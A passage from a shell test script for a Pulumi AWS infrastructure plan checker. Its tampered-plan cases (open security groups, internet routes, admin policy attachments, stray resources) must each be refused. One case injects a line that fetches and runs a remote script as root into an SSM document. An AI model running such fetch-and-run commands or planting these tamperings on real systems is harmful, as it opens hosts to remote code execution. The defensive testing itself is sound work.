const walk = (v, at) => { if (v === UNKNOWN || (typeof v === "string" && v.includes(UNKNOWN))) left.push(at); else if (v !== null && typeof v === "object") for (const [k, x] of Object.entries(v)) walk(x, `${at}.${k}`); };
plan.steps.forEach((s) => walk(s, name(s)));
if (left.length > 0) throw new Error(`existing_plan: unknown values left at ${left.slice(0, 8).join(", ")}`);
// operator-new-unknown: that create step with its document unknown, though nothing it depends on is created.
if (variant === "operator-new-unknown") byName("aws:iam/rolePolicy:RolePolicy", cfg.operatorRoleName).newState.inputs.policy = UNKNOWN;
// deployer-detached: the deployer no longer holds ai-env-ops: its attachment is deleted (a delete step: the old state
// only, as pulumi plans a resource the program no longer registers).
const detached = `aws:iam/userPolicyAttachment:UserPolicyAttachment::${pol.attachmentName(pol.DEPLOYER_USER_NAME, pol.OPS_POLICY_NAME)}`;
if (variant === "deployer-detached") {
    const s = plan.steps.find((x) => `${type(x)}::${name(x)}` === detached);
    s.op = "delete";
    delete s.newState;
}
// The three steps of a replacement (their order does not matter to the plan check).
const replacedSteps = (s, old) => [{ ...s, op: "delete-replaced", oldState: old, newState: undefined }, { ...s, op: "replace", oldState: old }, { ...s, op: "create-replacement", oldState: old }];
// deployer-replaced: the user ai-env-deployer is replaced once it exists (D12 refuses it).
if (variant === "deployer-replaced") {
    plan.steps = plan.steps.flatMap((s) => (type(s) === "aws:iam/user:User" && name(s) === pol.DEPLOYER_USER_NAME ? replacedSteps(s, s.oldState) : [s]));
}
// provider-replaced: the pinned aws provider is replaced (it would replace every resource it manages): always refused.
if (variant === "provider-replaced") plan.steps = plan.steps.flatMap((s) => (type(s) === "pulumi:providers:aws" ? replacedSteps(s, s.oldState) : [s]));
// document-duplicate-key: the status document with a runCommand key before its own. JSON.parse keeps the last one, so
// the content parses to the file, but SSM receives the string as it is (and whichever key it keeps runs as root).
if (variant === "document-duplicate-key") {
    const inputs = byName("aws:ssm/document:Document", spec.documentNames(cfg).status).newState.inputs;
    const tampered = inputs.content.replace("\"runCommand\":[", "\"runCommand\":[\"curl -s http://example.invalid | sh\"],\"runCommand\":[");
    if (tampered === inputs.content) throw new Error("existing_plan document-duplicate-key: no runCommand in the status document");
    inputs.content = tampered;
}
// bootstrap (D12): the stack before S8 operators, as the account root deploys it once. The users ai-env-deployer and
// ai-env-ops, their two policies, the six attachments and the three documents are created (no oldState: the old state
// holds no user ai-env-deployer); the three deploy policies are replaced, delete before replace (an explicit name),
// for their frozen descriptions; a created or replaced policy has no ARN yet, so the attachments name it unknown.
// bootstrap-unordered: the same, with ai-env-deployer created before its five policies (it depends on none of them).
if (variant === "bootstrap" || variant === "bootstrap-unordered") {
    const key = (s) => `${type(s)}::${name(s)}`;
    const created = new Set([
        ...[pol.DEPLOYER_USER_NAME, pol.OPS_USER_NAME].map((u) => `aws:iam/user:User::${u}`),
        ...[pol.DEPLOYER_POLICY_NAME, pol.OPS_POLICY_NAME].map((p) => `aws:iam/policy:Policy::${p}`),
        ...pol.USER_POLICY_ATTACHMENTS.map(([u, p]) => `aws:iam/userPolicyAttachment:UserPolicyAttachment::${pol.attachmentName(u, p)}`),
        ...spec.DOCUMENT_ROLES.map((r) => `aws:ssm/document:Document::${spec.documentNames(cfg)[r]}`),
    ]);
    const replaced = new Set([pol.DEPLOY_POLICY_NAME, pol.DEPLOY_EGRESS_POLICY_NAME, pol.DEPLOY_DNS_POLICY_NAME].map((p) => `aws:iam/policy:Policy::${p}`));
    const steps = [];
    let counted = 0;
    for (const s of plan.steps) {
        if (created.has(key(s))) {
            s.op = "create";
            delete s.oldState;
            if (type(s) === "aws:iam/userPolicyAttachment:UserPolicyAttachment") s.newState.inputs.policyArn = UNKNOWN;
            steps.push(s);
            counted++;
        } else if (replaced.has(key(s))) {
            const old = { ...s.oldState, inputs: { ...s.oldState.inputs, description: "(the description it had before the bootstrap)" } };
            steps.push(...replacedSteps(s, old));
            counted++;
        } else steps.push(s);
    }
    if (counted !== created.size + replaced.size) throw new Error(`existing_plan bootstrap: ${counted} of the ${created.size} created and ${replaced.size} replaced resources are in the plan`);
    plan.steps = steps;
    if (variant === "bootstrap-unordered") byName("aws:iam/user:User", pol.DEPLOYER_USER_NAME).newState.dependencies = [];
}
process.stdout.write(JSON.stringify(plan));
' "$scratch/plan-check" "$scratch/infra/egress-config.json" "$scratch/infra/image-config.json" "$1"
}

case "$negative" in
"")
    if [ "$mode" = firewall ]; then
        edit_file egress-config.json 's/"dnsMode": "none"/"dnsMode": "firewall"/'
        test "$(dns_mode)" = firewall || fail "the scratch egress-config.json does not say dnsMode firewall"
    fi
    # The human diff first (terminal only), then the --json plan (a shell variable, never a file) for the plan check.
    out=$(preview 2>&1) || { echo "$out"; fail "the preview failed"; }
    echo "$out"
    plan=$(json_plan) || fail "pulumi preview --json failed (the text preview above passed)"
    plan_check <<<"$plan" || fail "the plan check refused the plan (above)"
    # A --json plan has no stack outputs: the egress and operator outputs `ai-env infra status` reads, from the text
    # preview, and the two parameter hashes against the SHA-256 of the planned values.
    outputs=$(sed -n '/--outputs:--/,/^Resources:/p' <<<"$out")
    for k in connectorArn connectorName proxyPrivateIp proxyInstanceId egressVpcId vmSubnetId vmEgressSecurityGroupId proxySecurityGroupId \
        operatorRoleArn egressLogGroup dnsMode parameterPrefix squidConfSha256 allowSha256 \
        deployerUserName deployerUserArn opsUserName opsUserArn deployerPolicyArn opsPolicyArn deployEgressPolicyArn deployDnsPolicyArn \
        proxyReloadDocument proxyStatusDocument proxyPatchDocument \
        transcriptsBucket s3EndpointId s3EndpointPolicySha256 transcriptsBucketPolicySha256 proxyRouteTableId \
        relayInstanceId relayPrivateIp relayPublicIp relaySecurityGroupId relayRoleArn relayLogGroup relayParameterPrefix relayPort relayArtifactSha256 relayVersion; do
        grep -qE "^ +$k +: " <<<"$outputs" || fail "the preview plans no stack output $k"
    done
    # S13: the relay's address and port are the constants the VMs' rules and the Mac name; its binary is the one previewed.
    got=$(sed -n 's/^ *relayPrivateIp *: "\(.*\)"$/\1/p' <<<"$outputs")
    test "$got" = 10.42.0.20 || fail "output relayPrivateIp (${got:-none}) is not 10.42.0.20"
    got=$(sed -n 's/^ *relayPort *: \([0-9]*\)$/\1/p' <<<"$outputs")
    test "$got" = 7443 || fail "output relayPort (${got:-none}) is not 7443"
    got=$(sed -n 's/^ *relayArtifactSha256 *: "\([0-9a-f]\{64\}\)"$/\1/p' <<<"$outputs")
    test "$got" = "$relay_sha" || fail "output relayArtifactSha256 (${got:-none}) is not the previewed binary's ($relay_sha)"
    # S9: the endpoint policy's canonical hash (known in a preview: the policy is built from the account) is the planned
    # policy's, as policies.ts computes it (the compiled copy plan_check left).
    got=$(sed -n 's/^ *s3EndpointPolicySha256 *: "\([0-9a-f]\{64\}\)"$/\1/p' <<<"$outputs")
    want=$(node -e '
const pol = require(process.argv[1] + "/policies.js");
const plan = JSON.parse(require("fs").readFileSync(0, "utf-8"));
const s = plan.steps.find((x) => x.newState && x.newState.type === "aws:ec2/vpcEndpoint:VpcEndpoint");
process.stdout.write(s ? pol.canonicalPolicySha256(s.newState.inputs.policy) : "");
' "$scratch/plan-check" <<<"$plan")
    test -n "$got" && test "$got" = "$want" || fail "output s3EndpointPolicySha256 (${got:-none}) is not the canonical hash of the planned S3 endpoint policy (${want:-none})"
    for p in squid.conf allow; do
        k=$([ "$p" = allow ] && echo allowSha256 || echo squidConfSha256)
        got=$(sed -n "s/^ *$k *: \"\([0-9a-f]\{64\}\)\"\$/\1/p" <<<"$outputs")
        want=$(node -e '
const plan = JSON.parse(require("fs").readFileSync(0, "utf-8"));
const s = plan.steps.find((x) => x.newState && x.newState.type === "aws:ssm/parameter:Parameter" && x.urn.endsWith("::" + process.argv[1]));
process.stdout.write(s ? require("crypto").createHash("sha256").update(s.newState.inputs.insecureValue, "utf-8").digest("hex") : "");
' "ai-env-proxy-$p" <<<"$plan")
        test -n "$got" && test "$got" = "$want" || fail "output $k (${got:-none}) is not the SHA-256 of the planned $p parameter value (${want:-none})"
    done
    # The same stack once it exists: the plan check must accept it (ids from oldState, for same and update steps; the
    # deploy that adds the Deny, whose document is known then; S8 operators' bootstrap, D12) and refuse it tampered.
    for v in none updated operator-new bootstrap; do
        existing=$(existing_plan "$v" <<<"$plan") || fail "existing stack, $v: the plan could not be rewritten"
        out=$(plan_check <<<"$existing" 2>&1) || { echo "$out"; fail "existing stack, $v: the plan check refused the plan of the deployed stack (ids in oldState)"; }
        echo "existing stack, $v: $(first_line "check-plan: ok" "$out")"
    done
    for v in deploy-proxy-subnet operator-proxy-subnet operator-new-proxy-subnet operator-new-unknown connector-proxy-subnet connector-proxy-sg connector-operator-role \
        ops-runshell ops-extras ops-any-instance ops-attach-admin policy-replaced deployer-detached runtime-widen provider-replaced ops-holds-deploy \
        attachment-replaced deployer-replaced bootstrap-unordered document-duplicate-key runtime-policy-on-ops \
        ops-relay-commands ops-reads-tls relay-no-other-decrypt artifact-other-key; do
        t2=
        case "$v" in
        deploy-proxy-subnet) t="aws:iam/policy:Policy ai-env-deploy: policy is not policies.ts deployPolicy()" ;;
        operator-proxy-subnet | operator-new-proxy-subnet) t="aws:iam/rolePolicy:RolePolicy ai-env-egress-operator: policy is not policies.ts operatorRolePolicy()" ;;
        operator-new-unknown) t="aws:iam/rolePolicy:RolePolicy ai-env-egress-operator: policy is unknown on a create step whose inputs all exist" ;;
        connector-proxy-subnet) t="connector: subnetIds is not the VM subnet" ;;
        connector-proxy-sg) t="connector: securityGroupIds is not the VM security group" ;;
        connector-operator-role) t="connector: operatorRole arn:aws:iam::" ;;
        ops-runshell | ops-extras | ops-any-instance) t="aws:iam/policy:Policy ai-env-ops: policy is not policies.ts opsPolicy(); a statement differs" ;;
        ops-attach-admin) t="aws:iam/userPolicyAttachment:UserPolicyAttachment ai-env-ops--ai-env-ops: policyArn arn:aws:iam::aws:policy/AdministratorAccess is not arn:aws:iam::" ;;
        policy-replaced) t="aws:iam/policy:Policy ai-env-deploy: a replace step of ai-env-deployer's identity" ;;
        deployer-detached)
            t="aws:iam/userPolicyAttachment:UserPolicyAttachment: missing from the plan: ai-env-deployer--ai-env-ops"
            t2="aws:iam/userPolicyAttachment:UserPolicyAttachment ai-env-deployer--ai-env-ops: a delete step of ai-env-deployer's identity"
            ;;
        runtime-widen) t="aws:iam/userPolicy:UserPolicy MacRuntimePolicy: policy is not policies.ts runtimePolicy(); extra statements Widen" ;;
        provider-replaced)
            t="pulumi:providers:aws aws-$REGION: a replace step of a provider"
            t2="pulumi:providers:aws aws-$REGION: a create-replacement step of a provider"
            ;;
        ops-holds-deploy)
            t="aws:iam/userPolicyAttachment:UserPolicyAttachment ai-env-deployer--ai-env-deploy: user depends on aws:iam/user:User::ai-env-ops, expected aws:iam/user:User::ai-env-deployer"
            t2="aws:iam/userPolicyAttachment:UserPolicyAttachment ai-env-deployer--ai-env-deploy: user ai-env-ops is not ai-env-deployer"
            ;;
        attachment-replaced) t="aws:iam/userPolicyAttachment:UserPolicyAttachment ai-env-deployer--ai-env-deployer: a replace step of ai-env-deployer's identity" ;;
        deployer-replaced)
            t="aws:iam/user:User ai-env-deployer: a delete-replaced step of ai-env-deployer's identity"
            t2="aws:iam/user:User ai-env-deployer: a create-replacement step of ai-env-deployer's identity"
            ;;
        bootstrap-unordered) t="aws:iam/user:User ai-env-deployer: a create step that does not depend on aws:iam/policy:Policy::ai-env-deploy" ;;
        document-duplicate-key) t="aws:ssm/document:Document ai-env-proxy-status: content is not infra/proxy/documents/status.json" ;;
        runtime-policy-on-ops)
            t="aws:iam/userPolicy:UserPolicy MacRuntimePolicy: user depends on aws:iam/user:User::ai-env-ops, expected aws:iam/user:User::ai-env-runtime"
            t2="aws:iam/userPolicy:UserPolicy MacRuntimePolicy: user ai-env-ops is not ai-env-runtime"
            ;;
        ops-relay-commands | ops-reads-tls) t="aws:iam/policy:Policy ai-env-ops: policy is not policies.ts opsPolicy(); a statement differs" ;;
        relay-no-other-decrypt) t="aws:iam/rolePolicy:RolePolicy ai-env-relay: policy is not policies.ts relayRolePolicy(); missing NoOtherDecrypt" ;;
        artifact-other-key) t="relay artifact parameter: key relay/ai-env-relay-ffffffffffffffff is not the artifact object's key" ;;
        *) fail "existing stack, $v: no expected refusal" ;;
        esac
        tampered=$(existing_plan "$v" <<<"$plan") || fail "existing stack, $v: the plan could not be rewritten"
        if out=$(plan_check <<<"$tampered" 2>&1); then echo "$out"; fail "existing stack, $v: the plan check passed"; fi
        for want in "$t" ${t2:+"$t2"}; do
            diag=$(first_line "$want" "$out")
            test -n "$diag" || { echo "$out"; fail "existing stack, $v: the plan check refused, but not with \"$want\""; }
            echo "existing stack, $v: $diag"
        done
    done
    echo "$label: ok (dnsMode $(dns_mode): the preview, the plan check and the 40 egress, operator, transcript store and relay outputs passed; the existing-stack plans (same, update, the Deny created, the bootstrap) passed, their twenty-five tampered copies were refused)"
    ;;
no-logging)
    edit '/scratch:logging/d'
    ! grep -q 'logging: {' image.ts || fail "the scratch:logging marker no longer removes the logging input"
    if out=$(node_modules/.bin/tsc --noEmit --pretty false 2>&1); then fail "the typecheck passed without the logging input"; fi
    diag=$(grep -E "error TS[0-9]+: .*'logging'" <<<"$out" || true)
    test -n "$diag" || { echo "$out"; fail "the typecheck failed, but not on the missing logging input"; }
    echo "$diag"
    echo "preview-scratch NEGATIVE=no-logging: ok (typecheck refused the missing logging input)"
    ;;
no-logging-cast)
    # 1. The cast alone: the typecheck passes; the SDK's generated constructor refuses the missing input.
    edit '/scratch:logging/d' '/scratch:open/s/= {/= ({/' '/scratch:close/s/};/} as any);/'
    ! grep -q 'logging: {' image.ts || fail "the scratch:logging marker no longer removes the logging input"
    grep -q '} as any); // scratch:close' image.ts || fail "the scratch:open/close markers no longer add the cast"
    out=$(node_modules/.bin/tsc --noEmit --pretty false 2>&1) || { echo "$out"; fail "the typecheck failed: the cast did not hide the missing input"; }
    if out=$(preview 2>&1); then echo "$out"; fail "the preview passed without the logging input"; fi
    sdk="Missing required property 'logging'"
    grep -qF "$sdk" <<<"$out" || { echo "$out"; fail "the preview failed, but not on the SDK's guard for the missing logging input"; }
    echo "SDK guard: $(grep -F "$sdk" <<<"$out" | head -1 | sed 's/^ *//')"
    # 2. Also bypass the SDK guard (a raw CustomResource of the same type): the provider's Check must refuse.
    edit '/scratch:new/s/new awsnative\.lambda\.MicrovmImage(/new (pulumi.CustomResource as any)("aws-native:lambda:MicrovmImage", /'
    grep -q 'new (pulumi.CustomResource as any)("aws-native:lambda:MicrovmImage", cfg.imageName' image.ts || fail "the scratch:new marker no longer bypasses the SDK guard"
    out=$(node_modules/.bin/tsc --noEmit --pretty false 2>&1) || { echo "$out"; fail "the typecheck failed after bypassing the SDK guard"; }
    if out=$(preview 2>&1); then echo "$out"; fail "the preview passed without the logging input (provider side)"; fi
    ! grep -qF "$sdk" <<<"$out" || { echo "$out"; fail "the SDK guard still fired: the provider was not reached"; }
    diag=$(grep -iE 'required property.*logging|logging.*required' <<<"$out" || true)
    test -n "$diag" || { echo "$out"; fail "the preview failed, but the provider did not name the missing logging input"; }
    echo "provider: $diag"
    echo "preview-scratch NEGATIVE=no-logging-cast: ok (the SDK guard and the provider both refused the missing logging input)"
    ;;
region)
    pulumi config set aws-native:region eu-west-3 --stack scratch
    if out=$(preview 2>&1); then echo "$out"; fail "the preview passed with aws-native:region eu-west-3"; fi
    diag=$(grep -E "pinned to $REGION" <<<"$out" || true)
    test -n "$diag" || { echo "$out"; fail "the preview failed, but not with the region pin message"; }
    echo "$diag"
    echo "preview-scratch NEGATIVE=region: ok (the program refused aws-native:region eu-west-3)"
    ;;
vm-sg-open)
    edit_file egress-spec.ts 's|^\( *\)], // scratch:vm-rules$|\1{ direction: "egress", protocol: "tcp", port: 443, peer: { cidr: "0.0.0.0/0" }, description: "open" }], // scratch:vm-rules|'
    grep -qF 'description: "open" }], // scratch:vm-rules' egress-spec.ts || fail "the scratch:vm-rules marker no longer adds a rule to the VM security group"
    expect_refusal spec "the VM security group allows exactly two rules, egress TCP 3128 to 10.42.0.10/32 and TCP 7443 to 10.42.0.20/32"
    no_spec
    expect_refusal guard "egress guard (infra/egress.ts) refused aws:vpc/securityGroupEgressRule:SecurityGroupEgressRule ai-env-vm-egress-to-0.0.0.0-0-tcp-443"
    no_guard
    expect_plan_refusal "not in the stack inventory: ai-env-vm-egress-to-0.0.0.0-0-tcp-443" \
        "ai-env-vm-egress-to-0.0.0.0-0-tcp-443: ai-env-vm-egress egress tcp 443 0.0.0.0/0: the VM security group allows exactly two rules"
    echo "$label: ok (spec, guard and plan each refused an open VM security group)"
    ;;
private-route)
    edit_file egress-spec.ts '/scratch:vms-routes/s|routes: \[\]|routes: [{ cidr: "0.0.0.0/0", target: "igw" }]|'
    grep -qF 'routes: [{ cidr: "0.0.0.0/0", target: "igw" }] }, // scratch:vms-routes' egress-spec.ts || fail "the scratch:vms-routes marker no longer adds a route to the VM route table"
    expect_refusal spec "the VM route table must have no route"
    no_spec
    expect_refusal guard "egress guard (infra/egress.ts) refused aws:ec2/routeTable:RouteTable ai-env-egress-vms: the VM route table must have no route"
    no_guard
    expect_plan_refusal "route table ai-env-egress-vms: the VM route table must have no route" \
        "aws:ec2/routeTable:RouteTable ai-env-egress-vms: routes depends on aws:ec2/internetGateway:InternetGateway::ai-env-egress, expected"
    echo "$label: ok (spec, guard and plan each refused a route on the VM route table)"
    ;;
nacl-open)
    edit_file egress-spec.ts 's|^\( *\)], // scratch:nacl-egress$|\1{ ruleNo: 200, protocol: "tcp", action: "allow", cidr: "0.0.0.0/0", fromPort: 443, toPort: 443 }], // scratch:nacl-egress|'
    grep -qF 'fromPort: 443, toPort: 443 }], // scratch:nacl-egress' egress-spec.ts || fail "the scratch:nacl-egress marker no longer adds a rule to the VM subnet's NACL"
    expect_refusal spec "the VM subnet's network ACL must allow exactly two egress rules"
    no_spec
    expect_refusal guard "egress guard (infra/egress.ts) refused aws:ec2/networkAcl:NetworkAcl ai-env-egress-vms: the VM subnet's network ACL must allow exactly two egress rules"
    no_guard
    expect_plan_refusal "network ACL ai-env-egress-vms: the VM subnet's network ACL must allow exactly two egress rules"
    echo "$label: ok (spec, guard and plan each refused an extra allow rule on the VM subnet's NACL)"
    ;;
dns-support-on-in-none-mode)
    test "$(dns_mode)" = none || fail "egress-config.json is not in dnsMode none"
    edit_file egress-spec.ts '/scratch:vpc/s|enableDnsSupport: cfg.dnsMode === "firewall"|enableDnsSupport: true|'
    grep -qF 'enableDnsSupport: true, enableDnsHostnames: false }, // scratch:vpc' egress-spec.ts || fail "the scratch:vpc marker no longer turns DNS support on in the spec"
    expect_refusal spec "enableDnsSupport must be false in dnsMode none"
    # The spec intact, the VPC's own argument changed.
    restore egress-spec.ts
    edit_file egress.ts '/scratch:dns/s|enableDnsSupport: spec.vpc.enableDnsSupport|enableDnsSupport: true|'
    grep -qF 'enableDnsSupport: true, // scratch:dns' egress.ts || fail "the scratch:dns marker no longer turns DNS support on in egress.ts"
    expect_refusal guard "egress guard (infra/egress.ts) refused aws:ec2/vpc:Vpc ai-env-egress: enableDnsSupport must be false in dnsMode none"
    no_guard
    expect_plan_refusal "VPC: enableDnsSupport must be false in dnsMode none"
    echo "$label: ok (spec, guard and plan each refused DNS support in dnsMode none)"
    ;;
stray-rule)
    sg_rule='new aws.vpc.SecurityGroupIngressRule("stray-rule", { securityGroupId: net.vmSecurityGroup.id, ipProtocol: "tcp", fromPort: 22, toPort: 22, cidrIpv4: "0.0.0.0/0" }, { provider: awsProvider });'
    legacy='new aws.ec2.SecurityGroupRule("stray-legacy-rule", { type: "egress", securityGroupId: net.vmSecurityGroup.id, protocol: "-1", fromPort: 0, toPort: 0, cidrBlocks: ["0.0.0.0/0"] }, { provider: awsProvider });'
    route='new aws.ec2.Route("stray-route", { routeTableId: net.vpc.mainRouteTableId, destinationCidrBlock: "0.0.0.0/0", gatewayId: net.vpc.id }, { provider: awsProvider });'
    append "$sg_rule"
    expect_refusal guard "egress guard (infra/egress.ts) refused aws:vpc/securityGroupIngressRule:SecurityGroupIngressRule stray-rule: not in the stack inventory"
    restore index.ts
    append "$legacy"
    expect_refusal guard "egress guard (infra/egress.ts) refused aws:ec2/securityGroupRule:SecurityGroupRule stray-legacy-rule: not in the stack inventory"
    restore index.ts
    append "$route"
    expect_refusal guard "egress guard (infra/egress.ts) refused aws:ec2/route:Route stray-route: not in the stack inventory"
    restore index.ts
    append "$sg_rule"
    append "$legacy"
    append "$route"
    no_guard
    expect_plan_refusal "aws:vpc/securityGroupIngressRule:SecurityGroupIngressRule: not in the stack inventory: stray-rule" \
        "aws:ec2/securityGroupRule:SecurityGroupRule: not in the stack inventory: stray-legacy-rule" \
        "aws:ec2/route:Route: not in the stack inventory: stray-route"
    echo "$label: ok (the guard refused each stray network resource added outside egress.ts; the plan check refused all three)"
    ;;
stray-type)
    cfn='new aws.cloudformation.Stack("stray-cfn", { name: "ai-env-stray", templateBody: JSON.stringify({ Resources: { Open: { Type: "AWS::EC2::SecurityGroupEgress", Properties: { GroupId: "sg-00000000000000000", IpProtocol: "-1", CidrIp: "0.0.0.0/0" } } } }) }, { provider: awsProvider });'
    cc='new aws.cloudcontrol.Resource("stray-cloudcontrol", { typeName: "AWS::EC2::Route", desiredState: JSON.stringify({ RouteTableId: "rtb-00000000000000000", DestinationCidrBlock: "0.0.0.0/0", GatewayId: "igw-00000000000000000" }) }, { provider: awsProvider });'
    ext='new awsnative.ExtensionResource("stray-extension", { type: "AWS::EC2::Route", properties: { RouteTableId: "rtb-00000000000000000", DestinationCidrBlock: "0.0.0.0/0", GatewayId: "igw-00000000000000000" } }, { provider: nativeProvider });'
    ssm='new aws.ssm.Association("stray-association", { name: "AWS-RunShellScript", targets: [{ key: "InstanceIds", values: [net.instance.id] }], parameters: { commands: "true" } }, { provider: awsProvider });'
    prov='new aws.Provider("stray-provider", { region: "us-east-1" });'
    comp='new pulumi.ComponentResource("stray:index:Component", "stray-component");'
    for pair in "aws:cloudformation/stack:Stack stray-cfn|$cfn" "aws:cloudcontrol/resource:Resource stray-cloudcontrol|$cc" \
        "aws-native:index:ExtensionResource stray-extension|$ext" "aws:ssm/association:Association stray-association|$ssm" "pulumi:providers:aws stray-provider|$prov" \
        "stray:index:Component stray-component|$comp"; do
        restore index.ts
        append "${pair#*|}"
        case "$pair" in stray:*) want="component resources are refused" ;; *) want="not in the stack inventory" ;; esac
        expect_refusal guard "egress guard (infra/egress.ts) refused ${pair%%|*}: $want"
    done
    restore index.ts
    for code in "$cfn" "$cc" "$ext" "$ssm" "$prov" "$comp"; do append "$code"; done
    no_guard
    expect_plan_refusal "aws:cloudformation/stack:Stack: not in the stack inventory: stray-cfn" \
        "aws:cloudcontrol/resource:Resource: not in the stack inventory: stray-cloudcontrol" \
        "aws-native:index:ExtensionResource: not in the stack inventory: stray-extension" \
        "aws:ssm/association:Association: not in the stack inventory: stray-association" \
        "pulumi:providers:aws: not in the stack inventory: stray-provider" \
        "stray:index:Component: not in the stack inventory: stray-component" "stray:index:Component stray-component: a component resource"
    echo "$label: ok (the guard refused each resource of a type outside the inventory and a component; the plan check refused all six)"
    ;;
late-transform)
    append 'pulumi.runtime.registerResourceTransform((a) => (a.name === "ai-env-egress-vms" && a.type === "aws:ec2/routeTable:RouteTable" ? { props: { ...a.props, routes: [{ cidrBlock: "0.0.0.0/0", gatewayId: "igw-00000000000000000" }] }, opts: a.opts } : undefined));'
    expect_refusal seal "egress guard (infra/egress.ts): registerResourceTransform after the guard is refused"
    restore index.ts
    append 'pulumi.runtime.registerStackTransformation((a) => undefined);'
    expect_refusal seal "egress guard (infra/egress.ts): registerStackTransformation after the guard is refused"
    echo "$label: ok (transform registrations after the guard throw)"
    ;;
early-transform)
    # Before the guard, right after the imports: copy the proxy table's IGW route into the VM table.
    node -e '
const fs = require("fs");
const anchor = "import { Names, PROJECT, REGION } from \"./policies\";\n";
const s = fs.readFileSync("index.ts", "utf-8");
if (!s.includes(anchor)) process.exit(1);
const inject = "let strayIgw: unknown;\npulumi.runtime.registerResourceTransform((a) => { const routes = a.props.routes as { gatewayId?: unknown }[] | undefined; if (a.type === \"aws:ec2/routeTable:RouteTable\" && a.name === \"ai-env-egress-proxy\" && routes?.length) strayIgw = routes[0].gatewayId; return a.type === \"aws:ec2/routeTable:RouteTable\" && a.name === \"ai-env-egress-vms\" ? { props: { ...a.props, routes: [{ cidrBlock: \"0.0.0.0/0\", gatewayId: strayIgw ?? \"igw-00000000000000000\" }] }, opts: a.opts } : undefined; });\n";
fs.writeFileSync("index.ts", s.replace(anchor, anchor + inject));
' || fail "the early-transform anchor (the policies import) is no longer in index.ts"
    # One --json preview per run decides (the guard's verdict varies from run to run): its plan goes to the plan
    # check, or its diagnostics must carry the guard's refusal.
    out=$(typecheck) || { echo "$out"; fail "the typecheck failed"; }
    for run in 1 2 3; do
        if plan=$(pulumi preview --non-interactive --json --show-sames --show-reads --stack scratch 2>/dev/null); then
            if out=$(plan_check <<<"$plan" 2>&1); then echo "$out"; fail "run $run: the guard and the plan check both passed a route on the VM route table"; fi
            diag=$(first_line "the VM route table must have no route" "$out")
            test -n "$diag" || { echo "$out"; fail "run $run: the plan check refused, but not the VM route"; }
            echo "run $run: the guard passed it; plan: $diag"
        else
            diag=$(first_line "egress guard (infra/egress.ts) refused aws:ec2/routeTable:RouteTable ai-env-egress-vms" "$plan")
            test -n "$diag" || { grep -oE '"message": *"[^"]{0,300}' <<<"$plan" | head -5; fail "run $run: the preview failed, but not on the guard's refusal of the VM route table"; }
            echo "run $run: guard: ${diag%%\\n*}"
        fi
    done
    no_guard
    expect_plan_refusal "route table ai-env-egress-vms: the VM route table must have no route"
    echo "$label: ok (a transform registered before the guard was refused in every run; the plan check alone refuses it)"
    ;;
dns-firewall-qtype)
    edit_file egress-config.json 's/"dnsMode": "none"/"dnsMode": "firewall"/'
    test "$(dns_mode)" = firewall || fail "the scratch egress-config.json does not say dnsMode firewall"
    edit_file egress.ts '/scratch:fw-rule/s|action: "BLOCK", |action: "BLOCK", qType: "A", |'
    grep -qF 'qType: "A", ' egress.ts || fail "the scratch:fw-rule marker no longer adds a qType to the DNS Firewall rule"
    expect_refusal guard "egress guard (infra/egress.ts) refused aws:route53/resolverFirewallRule:ResolverFirewallRule ai-env-egress-block-all: input qType is outside the stack spec"
    no_guard
    expect_plan_refusal "aws:route53/resolverFirewallRule:ResolverFirewallRule ai-env-egress-block-all: input qType must be unset"
    echo "$label: ok (guard and plan each refused a DNS Firewall rule limited to one record type)"
    ;;
miswired)
    # The guard runs: in a preview the ids are unknown, so only the plan check (by URN) can see these.
    edit_file egress.ts '/scratch:assoc/s|\[table("proxy", proxySubnet), table("vms", vmSubnet)\]|[table("proxy", vmSubnet), table("vms", proxySubnet)]|'
    grep -qF '[table("proxy", vmSubnet), table("vms", proxySubnet)]' egress.ts || fail "the scratch:assoc marker no longer swaps the route table associations"
    expect_plan_refusal "aws:ec2/routeTableAssociation:RouteTableAssociation ai-env-egress-proxy: subnetId depends on aws:ec2/subnet:Subnet::ai-env-egress-vms" \
        "aws:ec2/routeTableAssociation:RouteTableAssociation ai-env-egress-vms: subnetId depends on aws:ec2/subnet:Subnet::ai-env-egress-proxy"
    restore egress.ts
    edit_file egress.ts '/scratch:rule-sg/s|securityGroupId: sgs\[k\].id,|securityGroupId: sgs.proxy.id,|'
    grep -qF 'securityGroupId: sgs.proxy.id,' egress.ts || fail "the scratch:rule-sg marker no longer attaches the rules to another group"
    expect_plan_refusal "ai-env-vm-egress-to-10.42.0.10-32-tcp-3128: securityGroupId depends on aws:ec2/securityGroup:SecurityGroup::ai-env-proxy"
    restore egress.ts
    edit_file egress.ts '/scratch:rule-peer/s|referencedSecurityGroupId: sgs\[rule.peer.sg\].id|referencedSecurityGroupId: sgs[k].id|'
    grep -qF 'referencedSecurityGroupId: sgs[k].id' egress.ts || fail "the scratch:rule-peer marker no longer makes a rule reference its own group"
    expect_plan_refusal "ai-env-proxy-from-ai-env-vm-egress-tcp-3128: referencedSecurityGroupId depends on aws:ec2/securityGroup:SecurityGroup::ai-env-proxy"
    # The Deny's document is unknown in this preview (accepted while the subnet is created): only its URNs tell.
    restore egress.ts
    edit_file egress.ts '/scratch:operator-deny/s|pulumi.all(\[names, vmSubnet.id, sgs.vm.id\])|pulumi.all([names, proxySubnet.id, sgs.vm.id])|'
    grep -qF 'pulumi.all([names, proxySubnet.id, sgs.vm.id])' egress.ts || fail "the scratch:operator-deny marker no longer builds the operator role's Deny from the proxy subnet"
    expect_plan_refusal "aws:iam/rolePolicy:RolePolicy ai-env-egress-operator: policy does not depend on aws:ec2/subnet:Subnet::ai-env-egress-vms" \
        "aws:iam/rolePolicy:RolePolicy ai-env-egress-operator: policy depends on aws:ec2/subnet:Subnet::ai-env-egress-proxy"
    # S8 operators: ai-env-ops' document is unknown in this preview as well (accepted while what it depends on is
    # created), so only its URNs tell that it names something other than the proxy instance (any instance, say).
    restore egress.ts
    edit_file index.ts '/scratch:ops-names/s|pulumi.all(\[names, net.instance.id, relay.instance.id\])|pulumi.all([names, net.vmSubnet.id, net.vmSubnet.id])|'
    grep -qF 'pulumi.all([names, net.vmSubnet.id, net.vmSubnet.id]).apply(([n, proxyInstanceId, relayInstanceId]) => ({ // scratch:ops-names' index.ts || fail "the scratch:ops-names marker no longer builds the ops policy from the VM subnet's id"
    expect_plan_refusal "aws:iam/policy:Policy ai-env-ops: policy does not depend on aws:ec2/instance:Instance::ai-env-egress-proxy" \
        "aws:iam/policy:Policy ai-env-ops: policy does not depend on aws:ec2/instance:Instance::ai-env-relay"
